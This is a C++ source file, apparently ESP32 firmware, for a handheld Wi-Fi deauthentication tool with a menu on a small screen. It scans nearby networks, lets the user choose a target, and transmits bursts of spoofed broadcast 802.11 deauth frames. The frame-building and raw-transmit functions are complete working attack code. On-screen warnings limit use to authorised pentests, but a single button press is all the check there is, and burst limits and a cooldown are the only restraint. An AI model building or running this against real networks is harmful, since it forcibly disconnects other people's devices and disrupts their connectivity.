#include "deauth_tool.h"
#include "config.h"
#include <WiFi.h>
#include <esp_wifi.h>

void DeauthTool::begin() {
  WiFi.mode(WIFI_OFF);
  _state = ST_WARNING;
  _sel = 0;
  _burstsFired = 0;
  _lastBurstMs = 0;
}

void DeauthTool::cancel() {
  WiFi.mode(WIFI_OFF);
}

void DeauthTool::doScan() {
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  _scanCount = WiFi.scanNetworks();
  _sel = 0;
  _state = (_scanCount > 0) ? ST_SELECT : ST_NONE_FOUND;
}

void DeauthTool::selMove(int d) {
  if (_state != ST_SELECT || _scanCount <= 0) return;
  _sel = ((_sel + d) % _scanCount + _scanCount) % _scanCount;
}

void DeauthTool::confirmStep() {
  switch (_state) {
    case ST_WARNING:
      _state = ST_SCANNING;
      doScan();
      break;
    case ST_NONE_FOUND:
      doScan();
      break;
    case ST_SELECT: {
      _targetSsid    = WiFi.SSID(_sel);
      _targetChannel = WiFi.channel(_sel);
      const uint8_t *bssid = WiFi.BSSID(_sel);
      memcpy(_targetBssid, bssid, 6);
      WiFi.scanDelete();
      _state = ST_CONFIRM;
      break;
    }
    case ST_CONFIRM:
      WiFi.mode(WIFI_STA);          // esp_wifi_80211_tx precisa de uma interface ativa
      esp_wifi_set_channel(_targetChannel, WIFI_SECOND_CHAN_NONE);
      _state = ST_ARMED;
      _burstsFired = 0;
      break;
    case ST_ARMED:
      if (millis() - _lastBurstMs >= DEAUTH_COOLDOWN_MS) fireBurst();
      break;
    default:
      break;
  }
}

// Frame de deauth 802.11 (26 bytes): cabecalho MAC (24) + reason code (2).
// Destino = broadcast (afeta todos os clientes associados ao BSSID); origem
// e BSSID = o AP alvo (spoofado), pra parecer que a desautenticacao veio dele.
static void buildDeauthFrame(uint8_t *pkt, const uint8_t *bssid) {
  int i = 0;
  pkt[i++] = 0xC0; pkt[i++] = 0x00;              // frame control: deauth (management/0xC)
  pkt[i++] = 0x00; pkt[i++] = 0x00;              // duration
  for (int k = 0; k < 6; k++) pkt[i++] = 0xFF;   // destino: broadcast
  for (int k = 0; k < 6; k++) pkt[i++] = bssid[k]; // origem = BSSID (spoofado)
  for (int k = 0; k < 6; k++) pkt[i++] = bssid[k]; // BSSID
  pkt[i++] = 0x00; pkt[i++] = 0x00;              // seq/frag
  pkt[i++] = 0x07; pkt[i++] = 0x00;              // reason code 7: "Class 3 frame from nonassociated STA"
}

void DeauthTool::fireBurst() {
  uint8_t pkt[26];
  buildDeauthFrame(pkt, _targetBssid);
  for (int i = 0; i < DEAUTH_BURST_FRAMES; i++) {
    esp_wifi_80211_tx(WIFI_IF_STA, pkt, sizeof(pkt), false);
    delay(5);
  }
  _burstsFired++;
  _lastBurstMs = millis();
}

// =================================================================== desenho ==
static void warnBanner(TFT_eSPI &tft, int y, const char *text) {
  tft.fillRect(0, y, tft.width(), 16, COLOR_WARN);
  tft.setTextColor(COLOR_BG, COLOR_WARN);
  tft.setTextDatum(MC_DATUM);
  tft.drawString(text, tft.width() / 2, y + 8, 1);
  tft.setTextDatum(TL_DATUM);
}

void DeauthTool::draw(TFT_eSPI &tft, bool full) {
  if (full) {
    tft.fillScreen(COLOR_BG);
    tft.fillRect(0, 0, tft.width(), 22, COLOR_SEL);
    tft.setTextDatum(TL_DATUM);
    tft.setTextColor(COLOR_FG, COLOR_SEL);
    tft.drawString("Desautenticacao (DoS)", 6, 4, 2);
  }
  tft.fillRect(0, 24, tft.width(), tft.height() - 24, COLOR_BG);
  tft.setTextDatum(TL_DATUM);
  warnBanner(tft, 26, "SO PENTEST AUTORIZADO POR ESCRITO");

  switch (_state) {
    case ST_WARNING: {
      tft.setTextColor(COLOR_WARN, COLOR_BG);
      tft.drawString("Isto DERRUBA dispositivos reais da", 8, 54, 2);
      tft.drawString("rede a forca. Nao e uma simulacao.", 8, 74, 2);
      tft.setTextColor(COLOR_FG, COLOR_BG);
      tft.drawString("Rajada limitada + cooldown entre", 8, 100, 2);
      tft.drawString("acionamentos (nao e flood continuo).", 8, 120, 2);
      tft.setTextColor(COLOR_OK, COLOR_BG);
      tft.drawString("[OK] confirmo que tenho autorizacao", 8, 176, 2);
      tft.setTextColor(COLOR_FG, COLOR_BG);
      tft.drawString("[BACK] cancelar e sair", 8, 200, 2);
      break;
    }
    case ST_SCANNING: {
      tft.setTextColor(COLOR_FG, COLOR_BG);
      tft.drawString("Escaneando redes por perto...", 8, 60, 2);
      break;
    }
    case ST_NONE_FOUND: {
      tft.setTextColor(COLOR_WARN, COLOR_BG);
      tft.drawString("Nenhuma rede encontrada.", 8, 60, 2);
      tft.setTextColor(COLOR_FG, COLOR_BG);
      tft.drawString("[OK] tentar de novo   [BACK] sair", 8, 90, 2);
      break;
    }
    case ST_SELECT: {
      tft.setTextColor(COLOR_FG, COLOR_BG);
      tft.drawString("Escolha a rede alvo (autorizada):", 8, 50, 2);
      int y = 74;
      for (int i = 0; i < _scanCount && i < 8; i++) {
        bool sel = (i == _sel);
        if (sel) tft.fillRect(4, y - 2, tft.width() - 8, 18, COLOR_ACCENT);
        tft.setTextColor(sel ? COLOR_BG : COLOR_FG, sel ? COLOR_ACCENT : COLOR_BG);
        char line[40];
        snprintf(line, sizeof(line), "c%-2d %s", WiFi.channel(i), WiFi.SSID(i).c_str());
        tft.drawString(line, 8, y, 2);
        y += 20;
      }
      tft.setTextColor(COLOR_FG, COLOR_BG);
      tft.drawString("girar=escolhe  OK=selecionar  BACK=sai", 8, 226, 1);
      break;
    }
    case ST_CONFIRM: {
      tft.setTextColor(COLOR_WARN, COLOR_BG);
      tft.drawString("Confirma atacar esta rede?", 8, 54, 2);
      tft.setTextColor(COLOR_ACCENT, COLOR_BG);
      char line[40];
      snprintf(line, sizeof(line), "\"%s\" (canal %d)", _targetSsid.c_str(), _targetChannel);
      tft.drawString(line, 8, 80, 2);
      tft.setTextColor(COLOR_FG, COLOR_BG);
      tft.drawString("Isto vai desconectar TODOS os", 8, 112, 2);
      tft.drawString("clientes reais associados a ela.", 8, 132, 2);
      tft.setTextColor(COLOR_OK, COLOR_BG);
      tft.drawString("[OK] confirmar e armar", 8, 176, 2);
      tft.setTextColor(COLOR_FG, COLOR_BG);
      tft.drawString("[BACK] cancelar e sair", 8, 200, 2);
      break;
    }
    case ST_ARMED: {
      tft.setTextColor(COLOR_WARN, COLOR_BG);
      tft.drawString("ARMADO", 8, 54, 4);
      tft.setTextColor(COLOR_ACCENT, COLOR_BG);
      char line[48];
      snprintf(line, sizeof(line), "Alvo: %s (c%d)", _targetSsid.c_str(), _targetChannel);
      tft.drawString(line, 8, 90, 2);

      uint32_t elapsed = millis() - _lastBurstMs;
      bool ready = (_burstsFired == 0) || (elapsed >= DEAUTH_COOLDOWN_MS);
      tft.setTextColor(ready ? COLOR_OK : COLOR_WARN, COLOR_BG);
      if (ready) {
        tft.drawString("[OK] disparar rajada", 8, 120, 2);
      } else {
        uint32_t waitS = (DEAUTH_COOLDOWN_MS - elapsed) / 1000 + 1;
        snprintf(line, sizeof(line), "Aguarde %lus (cooldown)", (unsigned long)waitS);
        tft.drawString(line, 8, 120, 2);
      }

      tft.setTextColor(COLOR_FG, COLOR_BG);
      snprintf(line, sizeof(line), "Rajadas disparadas: %lu (%d frames cada)",
               (unsigned long)_burstsFired, DEAUTH_BURST_FRAMES);
      tft.drawString(line, 8, 150, 1);
      tft.setTextColor(COLOR_WARN, COLOR_BG);
      tft.drawString("Registre isso no relatorio do teste.", 8, 166, 1);

      tft.setTextColor(COLOR_FG, COLOR_BG);
      tft.drawString("[BACK] sair", 8, 200, 2);
      break;
    }
  }
}
